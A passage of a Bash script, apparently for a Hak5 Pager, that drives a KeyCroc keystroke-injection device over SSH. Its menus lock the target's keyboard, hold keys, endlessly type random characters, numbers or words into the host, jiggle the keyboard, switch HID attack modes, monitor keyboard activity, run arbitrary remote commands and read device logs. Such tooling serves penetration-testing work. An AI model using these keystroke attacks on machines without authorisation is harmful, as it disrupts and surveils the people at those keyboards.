	# Execute the action selected from the custom commands menu.
	case "$custom" in
		"Custom_command")
			# Ask the user to enter a custom remote shell command.
			LOG yellow "[KEYCROC] Custom shell command selected. Awaiting command input..."
			custom=$(TEXT_PICKER "Enter Custom shell command" 'for file_path in $(find "/root/udisk/payloads" -maxdepth 1 -type f); do basename "$file_path"; done') || return

			# Stop if the user submits an empty command.
			if [[ -z "$custom" ]]; then
				LOG red "No custom command entered"
				PROMPT "No custom command entered"
				return
			fi

			# Display the output returned by the remote command.
			output=$(ssh_croc "$custom")
			LOG yellow "[KEYCROC] Custom shell command output:"
			LOG "$output"
			PROMPT "$output"
		;;
		"Lock_keyboard")
			# Send the keyboard-lock command to KeyCroc.
			LOG yellow "[KEYCROC] Keyboard lock selected. Locking input device..."
			ssh_croc 'sh -lc "QUACK LOCK"'
			LOG red "Warning: keyboard is now locked out"
			PROMPT "Warning: keyboard is now locked out"
		;;
		"Unlock_keyboard")
			# Send the keyboard-unlock command to restore input access.
			LOG yellow "[KEYCROC] Keyboard unlock selected. Restoring input access..."
			ssh_croc 'sh -lc "QUACK UNLOCK"'
			LOG green "Keyboard is now unlocked"
			PROMPT "Keyboard is now unlocked"
		;;
		"Hold_key")
			# Ask the user which key to hold and how long to hold it.
			LOG yellow "[KEYCROC] Hold-key mode selected. Awaiting key input..."
			KEY=$(TEXT_PICKER "Enter only one key" "Q") || return
			# Select one random character from the supplied key input.
			KEY="${KEY:$((RANDOM % ${#KEY})):1}"
			# Prompt for the duration of the hold operation in seconds.
			TIME=$(NUMBER_PICKER "Enter amount of time" "5") || return

			# Send the hold command to KeyCroc.
			ssh_croc "sh -lc 'QUACK HOLD STRING $KEY'"

			# Count down the selected duration while displaying the held key.
			for ((time=TIME; time>=1; time--)); do
				LOG "Stopping in $time... selected $KEY"
				sleep 1
			done

			# Release the held key after the countdown finishes.
			ssh_croc 'sh -lc "QUACK RELEASE"'

			LOG green "Hold_key attack stopped"
			PROMPT "Hold_key attack stopped"
		;;
		# Quack Attack menu.
		"Quack_Attack")
			LOG yellow "[KEYCROC] Keyboard Quack Attack selected. Initializing payload..."
			resp=$(LIST_PICKER \
				"QUACK ATTACK MENU" \
				"Random_character" \
				"Random_number" \
				"Random_word" \
				"Exit" \
				"Main_menu" \
				"Main_menu"
			)

			case "$resp" in
				"Random_character")
					LOG yellow "Random character attack selected. Generating keystroke payload..."
					# Define the pool of characters used to generate random strings.
					chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:/?.><'"'"'\"`~'

					# Run the random-character attack continuously in the background.
					while true; do
						# Generate a new random string containing five characters.
						random_chars=""
						for ((n = 0; n < 5; n++)); do
							random_chars+="${chars:$((RANDOM % ${#chars})):1}"
						done

						# Build the remote QUACK command to type the generated string.
						remote_cmd="QUACK STRING \"$random_chars\""
						# Send the command to KeyCroc and capture the SSH exit status.
						ssh_croc "sh -lc $(printf '%q' "$remote_cmd")"
						ssh_status=$?

						# Handle a lost SSH connection and retry until reconnection succeeds.
						if [ "$ssh_status" -eq 255 ]; then
							LOG red "[KEYCROC] Connection lost. Trying to reconnect..."
							while true; do
								sleep 3
								# Test the SSH connection before resuming the attack.
								if ssh_croc 'true' >/dev/null 2>&1; then
									LOG green "[KEYCROC] Reconnected. Resuming random-character attack."
									break
								fi
							done
							# Return to the main loop and generate another random string.
							continue
						elif [ "$ssh_status" -ne 0 ]; then
							LOG red "[KEYCROC] Command failed with status $ssh_status. Continuing..."
							sleep 1
							continue
						fi
						((i++))
						LOG red "ATTACK RANDOM CHAR COUNT: $i-$random_chars"
					done &
					attack_pid=$!
					stop_attack "Random_character"
				;;
				"Random_number")
					LOG yellow "Random number attack selected. Generating keystroke payload..."
					# Set the upper limit for randomly generated numbers.
					NUMBER_N=1000000

					# Continuously generate and send random numbers in the background.
					while true; do
						# Generate a random number between 1 and NUMBER_N.
						R_N="$(( ((RANDOM << 15) | RANDOM) % NUMBER_N + 1 ))"
						# Send the generated number to KeyCroc as a QUACK string.
						if ! ssh_croc "sh -lc 'QUACK STRING \"$R_N\"'"; then
							LOG red "[KEYCROC] Connection lost. Stopping random-number attack."
							break
						fi
						# Increment the successful-send counter and display the result.
						(( i++ ))
						LOG red "ATTACK RANDOM NUMBER COUNT: $i-$R_N"
					done &
					attack_pid=$!

					stop_attack "Random_number"
				;;
				"Random_word")
					LOG yellow "Random word attack selected. Generating keystroke payload..."

					# Download the English word list if it is not already available locally.
					if [ ! -f "$WORDFILE" ]; then
						# Ask the user for permission before downloading the word list.
						confirm=$(CONFIRMATION_DIALOG "Download English word list? $ENGLISH_WORD_LIST") || return
						if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
							spinnerid=$(START_SPINNER "Downloading English word list...")
							# Download the word list and save it to WORDFILE.
							if curl -L -s -f "$ENGLISH_WORD_LIST" -o "$WORDFILE"; then
								STOP_SPINNER "$spinnerid"
								LOG green "[PAGER] Downloaded English word list to $WORDFILE"
							else
								# Stop the spinner and remove the incomplete file if the download fails.
								STOP_SPINNER "$spinnerid"
								rm -f "$WORDFILE"
								LOG red "Failed to download English word list"
								return
							fi
						else
							# Stop the spinner and exit if the download is declined.
							STOP_SPINNER "$spinnerid"
							LOG red "Failed to download English word list"
							return
						fi
					fi

					# Verify that the word list exists before starting the attack.
					if [ -f "$WORDFILE" ]; then
						WORD_COUNT=$(wc -l < "$WORDFILE")
						# Exit if the word list contains no lines.
						if [ "$WORD_COUNT" -eq 0 ]; then
							LOG red "English word list is empty"
							return
						fi

						# Continuously select random words and send them to KeyCroc.
						while true; do
							# Select a random line number from the word list.
							RANDOM_LINE=$((RANDOM % WORD_COUNT + 1))
							# Read the word at the randomly selected line.
							R_W=$(sed -n "${RANDOM_LINE}p" "$WORDFILE")
							# Send the word followed by a Space key command.
							if ! ssh_croc "sh -lc 'QUACK STRING \"$R_W\" ; QUACK KEYCODE 00,00,2c'"; then
								LOG red "[KEYCROC] Connection lost. Stopping random-word attack."
								break
							fi
							# Increment the successful-send counter and display the selected word.
							(( i++ ))
							LOG red "ATTACK RANDOM WORD COUNT: $i-$R_W"
						done &
						attack_pid=$!

						stop_attack "Random_word"
					else
						LOG red "English word list not found"
						return
					fi
				;;
				"Main_menu")
					LOG yellow "Return to main menu"
					return
				;;
				"Exit")
					confirm=$(CONFIRMATION_DIALOG "Exit. ?") || return
					if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
						exit 0
					fi
				;;
			esac
		;;
		"Keyboard_Jiggler")
			LOG yellow "[KEYCROC] Keyboard Jiggler selected. Initiating keystroke activity..."
			LOG "QUACK KEYCODE 00,00,2c and QUACK BACKSPACE"

			# Continuously run the keyboard jiggler in the background.
			while true; do
				# Wait 30 seconds before sending the next keystroke sequence.
				for ((time=30; time>=1; time--)); do
					LOG blue "Starting Jiggler in $time..."
					sleep 1
				done
				# Send a Space key followed by Backspace to create keyboard activity.
				if ! ssh_croc "sh -lc 'QUACK KEYCODE 00,00,2c ; QUACK BACKSPACE'"; then
					LOG red "[KEYCROC] Connection lost. Stopping Keyboard Jiggler."
					break
				fi
				# Increment the jiggler counter and display the number of successful executions.
				(( i++ ))
				LOG red "KEYBOARD JIGGLER COUNT: $i"
			done &
			attack_pid=$!

			stop_attack "Keyboard_Jiggler"
		;;
		"Main_menu")
			LOG yellow "Return to main menu"
			return
		;;
		"Exit")
			confirm=$(CONFIRMATION_DIALOG "Exit. ?") || return
			if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
				exit 0
			fi
		;;
	esac
}

# menu loop for selected keycroc HID mode.
Attackmode_HID() {
	LOG yellow "[KEYCROC] AttackMode HID selected. Initializing HID interface..."

	# Execute the selected attack mode command on the remote KeyCroc.
	run_attackmode() {
		LOG red "Attackmode Mode selected $1"

		# Handle payload reloading separately because it requires sending
		# the RELOAD_PAYLOADS command through a Bash input stream.
		if [ "$1" = "RELOAD_PAYLOADS" ]; then
			if ssh_croc 'sh -lc "bash -s"' <<'EOF'
$RELOAD_PAYLOADS
EOF
			then
				# Report successful submission of the reload command.
				LOG green "KeyCroc payload reload command sent"
				PROMPT "KeyCroc payload reload command sent"
			else
				LOG red "Failed to send KeyCroc reload command"
				PROMPT "Failed to send KeyCroc reload command"
				return
			fi
			return
		fi

		# Send the selected attack mode command to KeyCroc over SSH.
		if ssh_croc "sh -lc '$1'"; then
			LOG green "KeyCroc Attackmode is now in $1"
			PROMPT "KeyCroc Attackmode is now in $1"
		else
			LOG red "Failed to change KeyCroc Attackmode."
			PROMPT "Failed to change KeyCroc Attackmode."
			return
		fi
	}

	# Keep displaying the HID menu until the user exits or returns.
	while true; do
		resp=$(LIST_PICKER \
			"ATTACKMODE HID MENU" \
			"ATTACKMODE HID STORAGE" \
			"ATTACKMODE HID" \
			"RELOAD_PAYLOADS" \
			"ATTACKMODE OFF" \
			"ARMING_MODE" \
			"ATTACKMODE RO_STORGE" \
			"ATTACKMODE HID AUTO_ETHERNET" \
			"ATTACKMODE HID SERIAL" \
			"CHECK_KEYBOARD" \
			"KEYBOARD_MONITOR" \
			"CHECK_PAYLOADS" \
			"Exit" \
			"Main_menu" \
			"Main_menu"
		)

		# Run the function associated with the selected menu option.
		case "$resp" in
			"ATTACKMODE HID STORAGE") run_attackmode "$resp" ;;
			"ATTACKMODE HID") run_attackmode "$resp" ;;
			"RELOAD_PAYLOADS") run_attackmode "$resp" ;;
			"ATTACKMODE OFF") run_attackmode "$resp" ;;
			"ARMING_MODE") run_attackmode "$resp" ;;
			"ATTACKMODE RO_STORGE") run_attackmode "$resp" ;;
			"ATTACKMODE HID AUTO_ETHERNET") run_attackmode "$resp" ;;
			"ATTACKMODE HID SERIAL") run_attackmode "$resp" ;;
			"CHECK_KEYBOARD")
				# Check the remote keyboard status and return a readable result.
				output=$(ssh_croc 'sh -lc '\''[ "$(KEYBOARD)" = PRESENT ] && echo "KEYBOARD PRESENT" || echo "KEYBOARD MISSING"'\''')
				LOG green "[KEYCROC] $output"
				PROMPT "KEYCROC $output"
			;;
			"KEYBOARD_MONITOR")
				# Monitor remote keyboard activity and inactivity in the background.
				keyboard_monitor() {
					LOG yellow "[KEYCROC] Keyboard ACTIVITY / INACTIVITY. Initiating activity..."
					LOG green "PRESS ANY BUTTON TO RETURN TO MENU"

					# Repeatedly wait for keyboard inactivity and activity events.
					while true; do
						# Wait for the remote keyboard to become inactive.
						if ssh_croc 'sh -lc "WAIT_FOR_KEYBOARD_INACTIVITY 1"' 2>/dev/null; then
							LOG red "[KEYCROC] KEYBOARD INACTIVE"
						fi

						# Wait for keyboard activity and report when detected.
						if ssh_croc 'sh -lc "WAIT_FOR_KEYBOARD_ACTIVITY 0"' 2>/dev/null; then
							LOG blue "[KEYCROC] KEYBOARD ACTIVE"
						fi
					sleep 1
					done
				}
				keyboard_monitor &
				keyboard_monitor_pid=$!

				# Terminate the monitor and clean up its process entry.
				WAIT_FOR_INPUT
				LOG red "[PAGER] Terminating Keyboard monitor session..."
				kill -9 "$keyboard_monitor_pid" 2>/dev/null
				wait "$keyboard_monitor_pid" 2>/dev/null
			;;
			"CHECK_PAYLOADS")
				output=$(ssh_croc 'sh -lc "CHECK_PAYLOADS"')
				LOG blue "--------------------------------------"
				LOG "KEYCROC PAYLOADS $output"
				LOG green "PRESS A BUTTON TO RETURN TO MENU"
				WAIT_FOR_BUTTON_PRESS A
			;;
			"Main_menu")
				LOG yellow "Return to main menu"
				return
			;;
			"Exit")
				confirm=$(CONFIRMATION_DIALOG "Exit. ?") || return
				if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
					exit 0
				fi
			;;
		esac
	done
}

# Keycroc status.
croc_status() {
	LOG ""
	LOG blue "================================================="
	LOG yellow "------------ KEYCROC STATUS ---------------------"
	LOG blue "================================================="
	LOG cyan "Checking KeyCroc connection..."

	if ! ssh_croc 'true' 2>/dev/null; then
		LOG red "STATUS: NOT CONNECTED"
		PROMPT "KeyCroc is not connected"
		return
	fi

	LOG green "STATUS: CONNECTED"
	spinnerid=$(START_SPINNER "Collecting system Information")

	keycroc_info=$(ssh_croc 'sh -lc '"'"'
		echo "===HOSTNAME==="
		cat /etc/hostname 2>/dev/null || echo "Unknown" ; echo

		echo "===OS==="
		cat /etc/os-release || echo "Unknown" ; echo

		echo "===KERNEL==="
		uname -r 2>/dev/null || echo "Unknown" ; echo

		echo "===ARCH==="
		uname -m 2>/dev/null || echo "Unknown" ; echo

		echo "===MACHINE==="
		uname -o 2>/dev/null || echo "Unknown" ; echo

		echo "===SHELL==="
		echo "$SHELL" 2>/dev/null || echo "Unknown" ; echo

		echo "===BOOT==="
		uptime -s 2>/dev/null || echo "Unknown" ; echo

		echo "===UPTIME==="
		uptime 2>/dev/null || echo "Unknown" ; echo

		echo "===LOAD==="
		cat /proc/loadavg 2>/dev/null | cut -d " " -f1-3 ; echo

		echo "===CPU==="
		grep -m1 -E "^(model name|Processor|cpu model|system type|machine)[[:space:]]*:" /proc/cpuinfo 2>/dev/null | cut -d ":" -f2- | sed "s/^ *//" ; echo

		echo "===CPU_CORES==="
		grep -c "^processor" /proc/cpuinfo 2>/dev/null ; echo

		echo "===CPU_MHZ==="
		grep -m1 -E "^(cpu MHz|BogoMIPS)[[:space:]]*:" /proc/cpuinfo 2>/dev/null | cut -d ":" -f2- | sed "s/^ *//" ; echo

		echo "===MEMORY==="
		awk "
			/MemTotal:/ {total=\$2}
			/MemFree:/  {free=\$2}
			/Buffers:/  {buffers=\$2}
			/^Cached:/  {cached=\$2}
			END {
				used = total - free - buffers - cached
				printf \"%d MB / %d MB\", used/1024, total/1024
			}
		" /proc/meminfo 2>/dev/null ; echo

		echo "===MEMORY_TOTAL==="
		awk "/MemTotal:/ {printf \"%d MB\", \$2/1024}" /proc/meminfo
		echo

		echo "===MEMORY_FREE==="
		awk "/MemFree:/ {printf \"%d MB\", \$2/1024}" /proc/meminfo
		echo

		echo "===STORAGE==="
		df -h / 2>/dev/null | tail -n 1 ; echo

		echo "===MOUNTS==="
		df -h 2>/dev/null | tail -n +2 ; echo

		echo "===IP==="
		ip -4 addr show 2>/dev/null |
		awk "/inet / {print \$2, \$NF}" ; echo

		echo "===ROUTE==="
		ip route show 2>/dev/null |
		awk "/default/ {print \$0; exit}" ; echo

		echo "===GATEWAY==="
		ip route show 2>/dev/null |
		awk "/default/ {print \$3; exit}" ; echo

		echo "===DNS==="
		cat /etc/resolv.conf 2>/dev/null |
		grep "^nameserver" |
		awk "{print \$2}" ; echo

		echo "===INTERFACES==="
		ip -br link show 2>/dev/null ||
		ip link show 2>/dev/null
		echo

		echo "===MACS==="
		for interface in /sys/class/net/*; do
			name=$(basename "$interface")
			mac=$(cat "$interface/address" 2>/dev/null)
			[ -n "$mac" ] && echo "$name : $mac"
		done
		echo

		echo "===KEYBOARD==="
		if [ "$(KEYBOARD)" = PRESENT ]; then
			echo "KEYBOARD PRESENT" ; echo
		else
			echo "KEYBOARD MISSING" ; echo
		fi

		echo "===PROCESS_COUNT==="
		ps w 2>/dev/null |
		tail -n +2 |
		wc -l ; echo

		echo "===PROCESSES==="
		ps w 2>/dev/null ; echo

		echo "===FILES==="
		for file in \
			/root/udisk/payloads \
			/root/udisk/tools \
			/root/udisk/loot \
			/root/udisk/config.txt \
			/root/udisk \
			/tmp \
			/var/log
		do
			if [ -d "$file" ]; then
				echo "[PRESENT] $file"
			fi
		done
		echo
		echo "__END__"
	'"'"'')

	if [ -z "$keycroc_info" ]; then
		STOP_SPINNER "$spinnerid"
		LOG red "KeyCroc information collection failed"
		PROMPT "KeyCroc information collection failed"
		return
	fi
	STOP_SPINNER "$spinnerid"
	PROMPT "KeyCroc status complete"

	LOG "$keycroc_info"

	LOG green "PRESS A BUTTON TO RETURN TO MENU"
	WAIT_FOR_BUTTON_PRESS A
}

# Keycroc log menu
Keycroc_logs() {
	LOG yellow "View KeyCroc log files on Pager"

	# Get the list of log files from the KeyCroc.
	LOG_FILE=$(ssh_croc 'ls -1 /var/log/' 2>/dev/null)

	# Check whether SSH failed or no files were returned.
	if [ -z "$LOG_FILE" ]; then
		LOG red "[KEYCROC] No logs found or SSH connection failed."
		PROMPT "No logs found or KeyCroc connection failed."
		return
	fi

	# Count the returned filenames.
	LOG "File /var/log Count: $(printf '%s\n' "$LOG_FILE" | wc -l)"
	# Build the list for the Pager menu.
	set --
	while IFS= read -r file; do
		[ -n "$file" ] && set -- "$@" "$file"
	done <<EOF
$LOG_FILE
EOF

	# Check whether any files were found.
	if [ "$#" -eq 0 ]; then
		LOG red "[KEYCROC] No log files found."
		PROMPT "No log files found."
		return
	fi

	# Build the log menu.
	resp=$(LIST_PICKER \
		"KEYCROC LOG" \
		"$@" \
		"Cancel" \
		"Cancel"
	) || return

	# Handle menu selection.
	case "$resp" in
		"Cancel"|"")
			LOG yellow "[PAGER] Cancelled."
			return
		;;
		*)
			LOG green "[KEYCROC] Selected log: $resp"
			# Display the selected log file on the Pager.
			ssh_croc "cat '/var/log/$resp'" 2>/dev/null |
			while IFS= read -r line; do
				LOG "$line"
			done
			LOG green "PRESS A BUTTON TO RETURN TO MENU"
			WAIT_FOR_BUTTON_PRESS A
		;;
	esac
}

# Main menu loop.
while true; do
	# Test ssh connection to keycroc.
	test_ssh

	resp=$(LIST_PICKER \
		"MAIN MENU-$ssh_test" \
		"Quack_Command" \
		"Ducky_Payload" \
		"keystrokes" \
		"Custom_commands" \
		"Attackmode_HID" \
		"Keycroc_status" \
		"Keycroc_logs" \
		"Reboot_Keycroc" \
		"Exit" \
		"Exit"
	)

	case "$resp" in
		"Quack_Command")
			Quack_Command
		;;
		"Ducky_Payload")
			Ducky_Payload
		;;
		"keystrokes")
			keystrokes
		;;
		"Custom_commands")
			Custom_commands
		;;
		"Attackmode_HID")
			Attackmode_HID
		;;
		"Keycroc_status")
			croc_status
		;;
		"Keycroc_logs")
			Keycroc_logs
		;;
		"Reboot_Keycroc")
			confirm=$(CONFIRMATION_DIALOG "REBOOT KEYCROC. ?") || return
			if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
				# Reboot keycroc.
				ssh_croc 'sh -lc "reboot --force"' >/dev/null 2>&1 &
				reboot_pid=$!
				sleep 2
				LOG red "[KEYCROC] Reboot command sent. The connection may drop while it restarts."
				# Do not kill every SSH process; other commands share the SSH master.
				wait "$reboot_pid" 2>/dev/null
				PROMPT "[KEYCROC] is now rebooting"
			fi
		;;
		"Exit")
			confirm=$(CONFIRMATION_DIALOG "Exit. ?") || exit 0
			if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
				exit 0
			fi
		;;
	esac
done
